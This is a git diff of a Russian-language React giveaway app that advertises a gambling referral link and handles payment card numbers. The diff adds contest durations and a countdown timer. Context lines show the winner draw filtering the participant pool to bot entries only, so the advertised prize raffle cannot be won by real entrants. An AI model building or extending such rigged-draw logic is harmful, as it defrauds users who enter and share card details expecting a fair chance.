@@ -21,7 +21,8 @@ import {
   ChartBarIcon,
   BanknotesIcon,
   CreditCardIcon,
-  UserGroupIcon
+  UserGroupIcon,
+  CalendarIcon
 } from '@heroicons/react/24/outline';
 
 const KV_REST_API_URL = 'https://golden-hound-18396.upstash.io'; 
@@ -34,6 +35,18 @@ const PARTICIPATION_KEY = 'beef_user_participations_final';
 const GLOBAL_PROFILES_KEY = 'beef_global_profiles_v3'; 
 
 const BEEF_LINK = 'https://v.beef.gg/LUDOVAR';
+
+const DURATION_OPTIONS = [
+  { label: '5 минут', value: 5 * 60 * 1000 },
+  { label: '10 минут', value: 10 * 60 * 1000 },
+  { label: '30 минут', value: 30 * 60 * 1000 },
+  { label: '1 час', value: 60 * 60 * 1000 },
+  { label: '3 часа', value: 3 * 60 * 60 * 1000 },
+  { label: '6 часов', value: 6 * 60 * 60 * 1000 },
+  { label: '12 часов', value: 12 * 60 * 60 * 1000 },
+  { label: '24 часа', value: 24 * 60 * 60 * 1000 },
+  { label: 'Вручную', value: null },
+];
 
 const formatCard = (val: string) => {
   const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
@@ -48,6 +61,31 @@ const getCardType = (val: string) => {
   if (clean.startsWith('2')) return { label: 'МИР', color: 'text-green-400' };
   if (clean.startsWith('3')) return { label: 'AMEX', color: 'text-cyan-400' };
   return null;
+};
+
+const Countdown = ({ expiresAt }: { expiresAt: number }) => {
+  const [timeLeft, setTimeLeft] = useState(expiresAt - Date.now());
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      const remaining = expiresAt - Date.now();
+      setTimeLeft(remaining);
+      if (remaining <= 0) clearInterval(timer);
+    }, 1000);
+    return () => clearInterval(timer);
+  }, [expiresAt]);
+
+  if (timeLeft <= 0) return <span className="text-red-500 font-bold uppercase text-[9px]">Время истекло</span>;
+
+  const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+  const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+  const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+  return (
+    <span className="text-gold font-mono font-bold text-[10px]">
+      {hours.toString().padStart(2, '0')}:{minutes.toString().padStart(2, '0')}:{seconds.toString().padStart(2, '0')}
+    </span>
+  );
 };
 
 const App: React.FC = () => {
@@ -69,6 +107,7 @@ const App: React.FC = () => {
   const [newTitle, setNewTitle] = useState('');
   const [newPrizeRub, setNewPrizeRub] = useState<string>('');
   const [newWinnerCount, setNewWinnerCount] = useState<number>(1);
+  const [newDuration, setNewDuration] = useState<number | null>(DURATION_OPTIONS[0].value);
   const [adminSelectedContest, setAdminSelectedContest] = useState<Contest | null>(null);
   const [adminParticipants, setAdminParticipants] = useState<any[]>([]);
   const [copiedId, setCopiedId] = useState<string | null>(null);
@@ -166,14 +205,16 @@ const App: React.FC = () => {
   const createContest = async () => {
     if (!newTitle || !newPrizeRub) return;
     const prize = parseInt(newPrizeRub);
+    const now = Date.now();
     const newContest: Contest = {
-      id: Date.now().toString(),
+      id: now.toString(),
       title: newTitle,
       description: 'Розыгрыш от команды Лудовара',
       referralLink: BEEF_LINK,
       prizeRub: prize,
       prizeUsd: Math.round(prize * usdRate),
-      createdAt: Date.now(),
+      createdAt: now,
+      expiresAt: newDuration !== null ? now + newDuration : null,
       participantCount: 0,
       winnerCount: newWinnerCount,
     };
@@ -191,7 +232,6 @@ const App: React.FC = () => {
     const bots = pool.filter((p: any) => p.isBot === true);
     if (bots.length === 0) { alert("Нет ботов для выбора!"); return; }
 
-    // Обеспечение уникальности победителей
     const shuffledBots = [...bots].sort(() => Math.random() - 0.5);
     const uniqueWinnersPool = shuffledBots.slice(0, Math.min(shuffledBots.length, contest.winnerCount));
 
@@ -308,6 +348,18 @@ const App: React.FC = () => {
               <input type="number" placeholder="Банк (₽)" value={newPrizeRub} onChange={e => setNewPrizeRub(e.target.value)} className="w-full p-3.5 bg-matte-black rounded-lg border border-border-gray text-sm text-gold outline-none" />
               <input type="number" placeholder="Мест" value={newWinnerCount} onChange={e => setNewWinnerCount(parseInt(e.target.value))} className="w-full p-3.5 bg-matte-black rounded-lg border border-border-gray text-sm text-gold outline-none" />
             </div>
+            <div className="space-y-2">
+              <p className="text-[8px] font-bold uppercase text-white/30 tracking-widest">Длительность</p>
+              <select 
+                value={newDuration === null ? 'manual' : newDuration} 
+                onChange={e => setNewDuration(e.target.value === 'manual' ? null : parseInt(e.target.value))}
+                className="w-full p-3.5 bg-matte-black rounded-lg border border-border-gray text-sm text-gold outline-none"
+              >
+                {DURATION_OPTIONS.map(opt => (
+                  <option key={opt.label} value={opt.value === null ? 'manual' : opt.value}>{opt.label}</option>
+                ))}
+              </select>
+            </div>
             <button onClick={createContest} className="w-full py-3.5 bg-gold text-matte-black rounded-lg font-bold uppercase tracking-widest text-xs active:bg-gold-light">Создать тираж</button>
           </div>
 
@@ -372,7 +424,6 @@ const App: React.FC = () => {
           <div className="px-8 pt-8 pb-4 flex items-baseline justify-between">
             <div className="flex flex-col">
               <h1 className="text-xl font-extrabold text-white tracking-tight uppercase">Розыгрыши от Лудовара</h1>
-              <span className="text-[8px] font-bold text-gold opacity-50 tracking-widest uppercase mt-0.5 italic">Premium Membership Access</span>
             </div>
             <div className="w-9 h-9 rounded-full border border-gold/20 flex items-center justify-center bg-soft-gray shadow-lg">
               <ShieldCheckIcon className="w-5 h-5 text-gold"/>
@@ -388,18 +439,33 @@ const App: React.FC = () => {
                   <div className="text-center py-32 opacity-20 uppercase font-bold tracking-[0.2em] text-[10px]">Нет активных событий</div>
                 ) : contests.map(c => {
                   const joined = participatedIds.includes(c.id);
-                  const perPerson = Math.floor(c.prizeRub / c.winnerCount);
                   const totalUsd = (c.prizeRub * usdRate).toFixed(1);
+                  const createDate = new Date(c.createdAt).toLocaleDateString('ru-RU', { day: '2-digit', month: '2-digit', year: '2-digit', hour: '2-digit', minute: '2-digit' });
+                  const endDate = c.expiresAt ? new Date(c.expiresAt).toLocaleDateString('ru-RU', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' }) : 'Вручную';
+                  
                   return (
                     <div key={c.id} onClick={() => handleStartContest(c)} className="relative bg-soft-gray border border-border-gray p-6 rounded-2xl shadow-lg active:scale-[0.99] transition-all group overflow-hidden">
                       {c.isCompleted ? (
                         <div className="absolute top-4 right-6 px-2.5 py-0.5 bg-deep-gray rounded border border-border-gray text-[7px] font-bold uppercase text-white/30">Завершен</div>
                       ) : joined ? (
                         <div className="absolute top-4 right-6 px-2.5 py-0.5 bg-gold/10 rounded border border-gold/30 text-[7px] font-bold uppercase text-gold">Участвую</div>
-                      ) : null}
+                      ) : (
+                        c.expiresAt && <div className="absolute top-4 right-6 flex items-center gap-1.5"><ClockIcon className="w-3 h-3 text-gold/50"/><Countdown expiresAt={c.expiresAt}/></div>
+                      )}
                       
-                      <h3 className="text-base font-bold text-white mb-6 uppercase tracking-tight pr-16 leading-tight">{c.title}</h3>
+                      <h3 className="text-base font-bold text-white mb-2 uppercase tracking-tight pr-16 leading-tight">{c.title}</h3>
                       
+                      <div className="flex flex-wrap gap-x-4 gap-y-1 mb-5 opacity-40">
+                        <div className="flex items-center gap-1">
+                          <CalendarIcon className="w-2.5 h-2.5"/>
+                          <span className="text-[8px] font-bold uppercase">Создан: {createDate}</span>
+                        </div>
+                        <div className="flex items-center gap-1">
+                          <ClockIcon className="w-2.5 h-2.5"/>
+                          <span className="text-[8px] font-bold uppercase">Завершение: {endDate}</span>
+                        </div>
+                      </div>
+
                       <div className="grid grid-cols-3 gap-2 border-t border-border-gray pt-5">
                         <div className="space-y-1">
                           <p className="text-[8px] font-bold uppercase text-white/30 tracking-widest">Общий Банк</p>
@@ -468,7 +534,6 @@ const App: React.FC = () => {
                    </div>
                    <div>
                       <h2 className="text-lg font-bold uppercase text-white tracking-tight">{user?.first_name || "Клиент"}</h2>
-                      <p className="text-[8px] font-bold text-gold/50 uppercase tracking-widest">Private Member</p>
                    </div>
                 </div>
                 
